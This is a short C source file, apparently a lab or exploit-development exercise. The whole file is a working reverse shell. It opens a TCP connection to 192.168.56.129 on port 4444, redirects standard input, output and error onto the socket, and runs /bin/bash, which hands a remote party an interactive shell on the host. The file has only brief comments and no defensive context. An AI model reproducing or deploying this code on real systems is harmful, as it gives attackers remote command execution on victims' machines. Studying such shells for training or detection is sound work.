#include <sys/types.h> // data types
#include <sys/socket.h> // socket structures
#include <netinet/in.h> // internet domain addresses
#include <stdio.h> // for debug output
#include <unistd.h> // for dup2

/*
Inspired by https://www.linuxhowtos.org/C_C++/socket.htm
*/

int main (int arbc, char * argv[]){

	// socket file descriptors
	int socketfd;

	/*
	struct sockaddr_in
	{
	  short   sin_family; 
	  u_short sin_port;
	  struct  in_addr sin_addr;
	  char    sin_zero[8]; //Not used, must be zero
	};
	*/

	struct sockaddr_in serv_addr = {0};
	// struct in_addr ip = {0};


	serv_addr.sin_family = AF_INET; /*int 2*/
	serv_addr.sin_port = htons(4444);
	if (!inet_aton("192.168.56.129", &(serv_addr.sin_addr.s_addr))){
		perror("ERROR converting IP address");
		return 1;	
	}

	// create new socket
	socketfd = socket(AF_INET /*int 2*/, SOCK_STREAM /*int 1*/,  0);


	if (socketfd < 0){
		perror("ERROR opening socket");
		return 1;		
	}


	if (connect(socketfd,&serv_addr,sizeof(serv_addr)) < 0){
		perror("ERROR connecting");
		return 1;
	}else{

		printf("Connected!\n");
	}
  
 	printf("Executing execve\n");

	// duplicate file descriptor handles to have STOUD, STDIN and STDERR to point to newsockfd
 	dup2(socketfd, 0);
 	dup2(socketfd, 1);
 	dup2(socketfd, 2);

 	
 	execve("/bin/bash", argv, NULL);

	return 0;


}